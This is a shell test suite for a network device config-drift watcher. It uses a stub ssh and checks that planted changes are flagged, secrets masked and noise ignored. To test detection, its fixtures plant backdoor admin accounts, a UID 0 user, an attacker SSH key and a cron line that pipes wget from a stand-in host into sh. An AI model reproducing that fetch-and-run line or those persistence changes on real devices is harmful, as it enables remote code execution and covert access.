#!/bin/sh
# Tests for roles/network/NW-30-device-watch.sh.
# A stand-in device for every brand: the stand-in ssh checks the password and
# prints the device's config from a file the test changes between runs (and,
# for the loop, between rounds).  Checks: the baseline choices, changes found
# with their section, level, meaning and undo hint, secrets masked, a change
# shown once and "back as before" when it goes, the "ours" question, noise
# that must not count as a change, a changed host key, the loop and Ctrl-C.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/network/NW-30-device-watch.sh"
export BT_SKIP_VERIFY=1
O="$T_TMP/out"; B="$T_TMP/bin"; D="$T_TMP/dev"; mkdir -p "$O" "$B" "$D"
STUB_DIR=$D; export STUB_DIR
cat >"$B/ssh" <<'STUB'
#!/bin/sh
host=""; seen=0
for a in "$@"; do [ "$seen" = 1 ] && continue; case "$a" in *@*) host=${a#*@}; seen=1 ;; esac; done
[ -f "$STUB_DIR/$host.hk" ] && { echo "@@@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @@@" >&2; echo "Host key verification failed." >&2; exit 255; }
pwf="$STUB_DIR/$host.pw"; [ -f "$pwf" ] || { echo "ssh: connect to host $host: Connection timed out" >&2; exit 255; }
[ "$SSHPASS" = "$(cat "$pwf")" ] || { echo "Permission denied" >&2; exit 255; }
[ -t 0 ] || cat >/dev/null
echo "$host# show running-config"
cat "$STUB_DIR/$host.cfg"
# the loop test: the next read gets the next config
[ -f "$STUB_DIR/$host.cfg.next" ] && mv "$STUB_DIR/$host.cfg.next" "$STUB_DIR/$host.cfg"
exit 0
STUB
printf '#!/bin/sh\n[ "$1" = -e ] || exit 9\nshift\nexec "$@"\n' >"$B/sshpass"
chmod +x "$B"/*
BT_SSH="$B/ssh"; BT_SSHPASS="$B/sshpass"; BT_NET_PASS='Dev-Pass-1'; export BT_SSH BT_SSHPASS BT_NET_PASS
newest() { for _f in "$O"/device-watch-*; do printf '%s %s\n' "${_f##*-}" "$_f"; done | sort -n | tail -n 1 | cut -d' ' -f2-; }
# shellcheck disable=SC2086
run() { $SH "$C" --out "$O" --no-color "$@"; }
# edit_f FILE COMMAND... -> FILE run through COMMAND (no "sed -i": not POSIX)
edit_f() { _ef=$1; shift; "$@" "$_ef" >"$_ef.n" && cat "$_ef.n" >"$_ef"; }
dev() { printf '%s\n' "$BT_NET_PASS" >"$D/$1.pw"; cat >"$D/$1.cfg"; }

cat >"$T_TMP/ios.cfg" <<'EOF'
Building configuration...
Current configuration : 1234 bytes
! Last configuration change at 10:00:00 UTC Mon Nov 16 2026
hostname R1
username admin privilege 15 secret 9 $9$okhash
interface GigabitEthernet0/1
 ip address 10.0.0.1 255.255.255.0
 shutdown
!
interface GigabitEthernet0/2
 ip address 10.0.1.1 255.255.255.0
!
ip access-list extended OUT_IN
 permit tcp any host 10.0.0.5 eq 80
 deny ip any any log
!
line vty 0 4
 transport input ssh
end
EOF

t_start "options"
$SH "$C" >/dev/null 2>&1; t_eq "$?" 2 "no device exits 2"
$SH "$C" --device r1,ios,cisco-ios --baseline maybe >/dev/null 2>&1; t_eq "$?" 2 "a bad --baseline exits 2"
$SH "$C" --device r1,ios,cisco-ios --every 3 >/dev/null 2>&1; t_eq "$?" 2 "--every under 10 seconds exits 2"
$SH "$C" --device r1,ios,cisco-nope >/dev/null 2>&1; t_eq "$?" 2 "an unknown vendor exits 2"
$SH "$C" --device r1,ios,cisco-ios,admin,22x >/dev/null 2>&1; t_eq "$?" 2 "a port that is not a number exits 2"
out=$($SH "$C" --help 2>&1); t_has "$out" "--baseline" "--help"

t_start "first run: the baseline"
dev ios <"$T_TMP/ios.cfg"
out=$(run --device r1,ios,cisco-ios --batch 2>&1)
t_has "$out" "Watch these 1 device(s)? (read-only" "asked to watch, read-only said"
t_has "$out" "which config is the trusted one (the baseline)? [F] f (default)" "no earlier baseline: fresh"
t_has "$out" "[ok] r1: baseline read now" "baseline read"
t_has "$out" "nobody to ask: one round" "no terminal: one round"
t_has "$out" "r1: no new change" "the same config: no change"
t_file "$O/net-watch/r1/base.norm" "the baseline is kept in --out"
t_hasnt "$(cat "$O/net-watch/r1/base.norm")" "Last configuration change" "time stamps are not part of it"
t_eq "$(ls -ld "$O/net-watch/r1" | cut -c1-10)" "drwx------" "its folder is mode 700"

t_start "changes are found and explained"
cat >"$D/ios.cfg" <<'EOF'
Building configuration...
Current configuration : 1301 bytes
! Last configuration change at 10:05:00 UTC Mon Nov 16 2026
hostname R1
username admin privilege 15 secret 9 $9$okhash
username evil privilege 15 secret 5 $1$evilhash
interface GigabitEthernet0/1
 ip address 10.0.0.1 255.255.255.0
 shutdown
!
interface GigabitEthernet0/2
 ip address 10.0.1.1 255.255.255.0
 shutdown
!
ip access-list extended OUT_IN
 deny ip any any log
 permit tcp any host 10.0.0.5 eq 80
!
snmp-server community public RO
line vty 0 4
 transport input telnet ssh
end
EOF
out=$(run --device r1,ios,cisco-ios --batch 2>&1)
_rd=$(newest)
t_has "$out" "which config is the trusted one (the baseline)? [K/f] k (default)" "the earlier baseline is offered first"
t_has "$out" "[!] HIGH added: username evil privilege 15 secret 5 ****" "a new account, HIGH, secret masked"
t_has "$out" "account: an account added or changed: a back door?" "what it may mean"
t_has "$out" "undo (not sent): configure terminal / no username evil privilege 15 secret 5 ****" "the undo hint"
t_has "$out" "added: shutdown" "a shutdown on the other interface is seen"
t_has "$out" "in: interface GigabitEthernet0/2" "with its section"
t_has "$out" "undo (not sent): configure terminal / interface GigabitEthernet0/2 / no shutdown" "the hint goes into the section"
t_has "$out" "moved: permit tcp any host 10.0.0.5 eq 80" "a rule moved below the deny is seen"
t_has "$out" "added: snmp-server community ****" "SNMP, masked"
t_has "$out" "removed: transport input ssh" "a removed line"
t_has "$out" "added: transport input telnet ssh" "telnet allowed"
t_has "$out" "left open (nobody to ask" "batch never says ours"
t_hasnt "$out" "Last configuration change" "time stamps are no change"
t_hasnt "$out" "Current configuration" "the size line is no change"
t_fail "the secret is in no file of the run" grep -rq 'evilhash' "$_rd"
t_fail "nor the community" grep -rqw 'public' "$_rd"
t_ok "the full read is kept (mode 600)" sh -c "ls '$O/net-watch/r1/copies/' | grep -q 'Z.cfg'"
t_ok "changes.txt" grep -q 'HIGH  added    account' "$_rd/changes.txt"
t_ok "undo-hints.txt" grep -q 'no username evil' "$_rd/undo-hints.txt"
t_fail "no CSV files" sh -c "find '$_rd' -name '*.csv' | grep -q ."
t_has "$(cat "$_rd/summary.txt")" "r1               6 open" "the summary lists what is open"

t_start "shown once; back as before"
out=$(run --device r1,ios,cisco-ios --batch 2>&1)
t_has "$out" "r1: no new change" "the same changes are not shown again"
t_has "$(cat "$(newest)/summary.txt")" "6 open" "but stay open"
grep -v 'username evil' "$D/ios.cfg" >"$D/ios.n"; cat "$D/ios.n" >"$D/ios.cfg"
out=$(run --device r1,ios,cisco-ios --batch 2>&1)
t_has "$out" "[ok] r1: back as in the baseline: username evil privilege 15 secret 5 ****" "a change that goes away is shown"
t_has "$(cat "$(newest)/summary.txt")" "5 open" "and leaves the open list"

t_start "the baseline from NW-01"
dev ios2 <"$T_TMP/ios.cfg"
mkdir -p "$O/net-configs/r2"; cp "$T_TMP/ios.cfg" "$O/net-configs/r2/20261119T100000Z.cfg"; echo 20261119T100000Z >"$O/net-configs/r2/latest"
printf 'ip route 0.0.0.0 0.0.0.0 6.6.6.6\n' >>"$D/ios2.cfg"
out=$(run --device r2,ios2,cisco-ios --batch 2>&1)
t_has "$out" "which config is the trusted one (the baseline)? [N/f] n (default)" "NW-01's copy offered first"
t_has "$out" "the baseline is NW-01's copy from 20261119T100000Z" "and used"
t_has "$out" "[!] HIGH added: ip route 0.0.0.0 0.0.0.0 6.6.6.6" "the change since NW-01's copy"
t_has "$out" "routing: traffic sent somewhere else?" "routing"
out=$(run --device r2,ios2,cisco-ios --baseline fresh --batch 2>&1)
t_has "$out" "r2: no new change" "--baseline fresh: what is there now is trusted"

t_start "questions on a terminal"
if command -v script >/dev/null 2>&1; then
    dev ios3 <"$T_TMP/ios.cfg"
    run --device r3,ios3,cisco-ios --baseline fresh --once --batch >/dev/null 2>&1
    printf 'ip access-list extended bt-team\n permit ip 10.0.0.0 0.0.0.255 any\nlogging host 6.6.6.6\n' >>"$D/ios3.cfg"
    # watch: Enter; baseline: Enter (keep); every: Enter; how long: o; ours: e; then o, o, n
    printf '\n\n\no\ne\no\no\nn\n' >"$T_TMP/ans"
    BT_NO_TTY=0 script -qc "$SH '$C' --out '$O' --no-color --device r3,ios3,cisco-ios" /dev/null <"$T_TMP/ans" >"$T_TMP/pty.out" 2>&1
    out=$(cat "$T_TMP/pty.out")
    t_has "$out" "were these 3 change(s) made by your team?" "the ours question"
    t_has "$out" "(probably ours: NW-20/NW-21)" "NW-20's names are marked"
    t_has "$out" "1 left open" "line by line: one left open"
    t_eq "$(grep -c . "$O/net-watch/r3/ok")" 2 "two taken into the baseline"
    out=$(run --device r3,ios3,cisco-ios --once --batch 2>&1)
    t_has "$out" "r3: no new change" "accepted lines are not shown again"
    t_has "$(cat "$(newest)/summary.txt")" "logging host 6.6.6.6" "the one left open is still listed"
    # someone takes away a change we said was ours
    edit_f "$D/ios3.cfg" grep -v 'permit ip 10.0.0.0 0.0.0.255 any'
    out=$(run --device r3,ios3,cisco-ios --once --batch 2>&1)
    t_has "$out" "[!] HIGH r3: a change you said was OURS was undone: permit ip 10.0.0.0 0.0.0.255 any" "an undone 'ours' change is shown"
    out=$(run --device r3,ios3,cisco-ios --once --batch 2>&1)
    t_hasnt "$out" "was undone" "once"
    # all ours by default when every line has NW-20/21 names
    printf 'access-list BT-IN extended deny ip any any log\n' >>"$D/ios3.cfg"
    printf '\n\n\no\n\n' >"$T_TMP/ans"
    BT_NO_TTY=0 script -qc "$SH '$C' --out '$O' --no-color --device r3,ios3,cisco-ios" /dev/null <"$T_TMP/ans" >"$T_TMP/pty.out" 2>&1
    t_has "$(cat "$T_TMP/pty.out")" "taken into the baseline" "only NW-20/21 names: Enter says ours"
fi

t_start "other brands"
dev vy <<'EOF'
set interfaces ethernet eth0 address '10.0.0.1/24'
set service ssh port '22'
set system login user vyos authentication encrypted-password '$6$ok'
EOF
dev fg <<'EOF'
#config-version=FGT60F-7.2.5-FW-build1517-230606:opmode=0:vdom=0:user=admin
#conf_file_ver=1111
config system admin
    edit "admin"
        set password ENC SH2aaaa
    next
end
config firewall policy
    edit 1
        set name "web"
    next
end
EOF
dev mt <<'EOF'
# nov/19/2026 10:00:00 by RouterOS 7.11
/ip firewall filter
add action=accept chain=forward comment="a very long rule that the export \
    wraps" dst-port=80 protocol=tcp
/user
add group=full name=admin
EOF
dev lx <<'EOF'
# Generated by iptables-save v1.8.7 on Thu Nov 19 10:00:00 2026
*filter
:INPUT ACCEPT [10:200]
-A INPUT -p tcp --dport 22 -j ACCEPT
COMMIT
# Completed on Thu Nov 19 10:00:00 2026
EOF
dev pa <<'EOF'
rulebase {
  security {
    rules {
      web {
        from untrust;
        to trust;
      }
    }
  }
}
EOF
dev pf <<'EOF'
<pfsense>
 <revision><time>1700000000</time></revision>
 <system><user><name>admin</name></user></system>
</pfsense>
EOF
BR="--device v1,vy,vyos --device f1,fg,fortigate --device m1,mt,mikrotik --device l1,lx,linux --device p1,pa,paloalto --device s1,pf,pfsense"
# shellcheck disable=SC2086
run $BR --baseline fresh --batch >/dev/null 2>&1
# noise only: FortiGate ENC and header, MikroTik date and line wrap, iptables counters and dates, pfSense time
edit_f "$D/fg.cfg" sed 's/ENC SH2aaaa/ENC SH2bbbb/; s/conf_file_ver=1111/conf_file_ver=2222/'
edit_f "$D/mt.cfg" sed 's|nov/19/2026 10:00:00|nov/19/2026 10:09:00|'
edit_f "$D/lx.cfg" sed 's/\[10:200\]/[99:9999]/; s/10:00:00/10:09:00/'
edit_f "$D/pf.cfg" sed 's/1700000000/1700009999/'
# shellcheck disable=SC2086
out=$(run $BR --batch 2>&1)
for d in v1 f1 m1 l1 p1 s1; do t_has "$out" "$d: no new change" "$d: no change from noise"; done
printf "set system login user evil authentication encrypted-password '\$6\$bad'\n" >>"$D/vy.cfg"
edit_f "$D/fg.cfg" awk '$0 == "config firewall policy" { print "config system admin"; print "    edit \"evil\""; print "        set accprofile \"super_admin\""; print "    next"; print "end" } { print }'
printf '/ip firewall nat\nadd action=dst-nat chain=dstnat dst-port=4444 protocol=tcp to-addresses=10.0.0.9\n' >>"$D/mt.cfg"
printf '/user\nadd group=full name=evil\n' >>"$D/mt.cfg"
printf 'set interfaces ethernet eth0 description %s\n' "'description with tripwire'" >>"$D/vy.cfg"
edit_f "$D/lx.cfg" awk '$0 == "COMMIT" { print "-A INPUT -p tcp --dport 4444 -j ACCEPT" } { print }'
printf 'table inet evil {\n\tchain c {\n\t\ttype filter hook input priority filter; policy accept;\n\t\ttcp dport 4444 accept\n\t}\n}\n' >>"$D/lx.cfg"
edit_f "$D/pa.cfg" awk '{ print } $0 == "        to trust;" { print "        action allow;" }'
edit_f "$D/pf.cfg" sed 's|<name>admin</name>|<name>evil</name>|'
# shellcheck disable=SC2086
out=$(run $BR --batch 2>&1)
t_has "$out" "undo (not sent): configure / delete system login user evil authentication encrypted-password ****" "VyOS: delete hint, secret masked"
t_has "$out" 'undo (not sent): config system admin / delete "evil" / end' "FortiGate: delete the new admin"
t_has "$out" "added: add action=dst-nat chain=dstnat dst-port=4444" "MikroTik: the new NAT"
t_has "$out" "NAT: a port forwarded in to a box?" "MikroTik: what it may mean"
t_has "$out" "/ip firewall nat print, find the new entry" "MikroTik: hint"
t_ok "MikroTik: a user added under /user is an account, HIGH" grep -q 'HIGH  added    account .*add group=full name=evil' "$(newest)/changes.txt"
t_ok "a description is not a route (no 'rip' inside a word)" grep -q 'MED   added    other .*description with tripwire' "$(newest)/changes.txt"
t_has "$out" "undo (not sent): iptables -t filter -D INPUT -p tcp --dport 4444 -j ACCEPT" "Linux: iptables -D hint"
t_has "$out" "in: rulebase > security > rules > web" "Palo Alto: the section path"
t_has "$out" "undo (not sent): nft delete table inet evil" "Linux: a new nft table"
t_has "$out" "undo (not sent): nft delete chain inet evil c" "Linux: a new nft chain"
t_has "$out" "Config History" "pfSense: the GUI rollback"
t_fail "VyOS hash not written" grep -rq 'bad' "$(newest)/changes.txt"

t_start "host key changed, device down"
: >"$D/vy.hk"; rm -f "$D/fg.pw"
# shellcheck disable=SC2086
out=$(run --device v1,vy,vyos --device f1,fg,fortigate --batch 2>&1)
t_has "$out" "[!] HIGH v1: its SSH host key CHANGED" "a changed host key is HIGH"
t_has "$out" "f1: cannot read it (ssh: connect to host fg: Connection timed out)" "a device that cannot be read"
rm -f "$D/vy.hk"; printf '%s\n' "$BT_NET_PASS" >"$D/fg.pw"

t_start "the loop, and Ctrl-C"
dev ios4 <"$T_TMP/ios.cfg"
run --device r4,ios4,cisco-ios --baseline fresh --once --batch >/dev/null 2>&1
{ cat "$T_TMP/ios.cfg"; printf 'username late privilege 15 secret 5 $1$x\n'; } >"$D/ios4.cfg.next"
# export in a subshell: ksh93 does not pass "A=1 func" on to what func runs
out=$(export BT_TEST_FAST=1; run --device r4,ios4,cisco-ios --rounds 3 --every 1 --batch 2>&1)
t_has "$out" "3 round(s), every 1 seconds" "rounds"
t_has "$out" "-- round 2" "round 2 ran"
t_has "$out" "HIGH added: username late" "a change between rounds is seen"
t_eq "$(grep -c 'username late' "$(newest)/changes.txt")" 1 "and shown once"
# A background yash started by a yash test does not take TERM the way a
# terminal Ctrl-C reaches it (even a three-line script dies instead of
# running its trap), so this one check is left out under yash.
case "$SH" in *yash*) t_ok "skipped under yash: background TERM from a yash parent" true ;; *)
env BT_TEST_FAST=1 $SH "$C" --out "$O" --no-color --device r4,ios4,cisco-ios --for 0 --every 1 --batch >"$T_TMP/stop.out" 2>&1 &
_bg=$!
# Stop it once the watch loop runs (a slower shell may still be starting
# after a fixed few seconds, before it listens for Ctrl-C).
_i=0; while ! grep -q -- '-- round' "$T_TMP/stop.out" 2>/dev/null && [ "$_i" -lt 30 ]; do sleep 1; _i=$((_i + 1)); done
kill -TERM "$_bg"; wait "$_bg"; _rc=$?
t_eq "$_rc" 0 "stopping it is a normal end (exit 0)"
t_has "$(cat "$T_TMP/stop.out")" "Stopped (Ctrl-C) after" "it says so"
t_file "$(newest)/summary.txt" "and still writes the summary"
;; esac

t_start "nothing secret left behind"
t_fail "no device password anywhere in --out" grep -rq 'Dev-Pass-1' "$O"
t_start "OpenWRT"
dev ow <<'EOF'
===release
DISTRIB_ID='OpenWrt'
===uci
package firewall

config zone
	option name 'wan'
	option input 'REJECT'

config redirect
	option name 'web'
	option src 'wan'
	option src_dport '80'
	option dest_ip '192.168.220.10'
	option target 'DNAT'

package wireless

config wifi-iface 'x'
	option key 'Sup3rS3cretWifi'
===nft
table inet fw4 {
	chain input {
		counter packets 10 bytes 200 accept
	}
}
===addr
3: wan    inet 10.100.7.2/24 scope global wan\       valid_lft 300sec preferred_lft 300sec
===passwd
root:x:0:0:root:/root:/bin/ash
===keys
===cron
===startup
S50dropbear
EOF
run --device router,ow,openwrt,root --baseline fresh --batch >/dev/null 2>&1
# noise only: counters and DHCP lease time
edit_f "$D/ow.cfg" sed 's/packets 10 bytes 200/packets 99 bytes 9999/; s/300sec/77sec/g'
out=$(run --device router,ow,openwrt,root --batch 2>&1)
t_has "$out" "router: no new change" "OpenWRT: counters and lease times are noise"
# planted: a port forward, a UID 0 account, a root key, a cron job
edit_f "$D/ow.cfg" awk -v q="'" '$0 == "package wireless" { print "config redirect"; print "\toption name " q "x" q; print "\toption src " q "wan" q; print "\toption src_dport " q "4444" q; print "\toption dest_ip " q "192.168.220.44" q; print "\toption target " q "DNAT" q; print "" } { print }'
edit_f "$D/ow.cfg" awk '{ print } $0 == "===passwd" { print "toor:x:0:0:toor:/root:/bin/ash" } $0 == "===keys" { print "ssh-ed25519 AAAAC3Nza evil@kali" } $0 == "===cron" { print "*/5 * * * * wget -qO- http://203.0.113.9/x | sh" }'
out=$(run --device router,ow,openwrt,root --batch 2>&1)
ch=$(cat "$(newest)/changes.txt")
t_ok "OpenWRT: a new port forward is NAT, HIGH" grep -q "HIGH  added    NAT .*src_dport '4444'" "$(newest)/changes.txt"
t_has "$out" "in: package firewall > config redirect" "with its uci section"
t_has "$out" "uci show firewall, find it under" "and a uci undo hint"
t_has "$out" "fw4 reload" "that reloads the firewall"
t_ok "OpenWRT: a UID 0 account is an account, HIGH" grep -q "HIGH  added    account .*toor:x:0:0" "$(newest)/changes.txt"
t_has "$out" "delete its line in /etc/passwd" "account undo hint"
t_ok "OpenWRT: a root key is HIGH" grep -q "HIGH  added    password/key .*evil@kali" "$(newest)/changes.txt"
t_ok "OpenWRT: a cron job is HIGH" grep -q "HIGH  added    scheduled job .*wget" "$(newest)/changes.txt"
t_hasnt "$out$ch" "Sup3rS3cretWifi" "the Wi-Fi key is never shown"

t_done
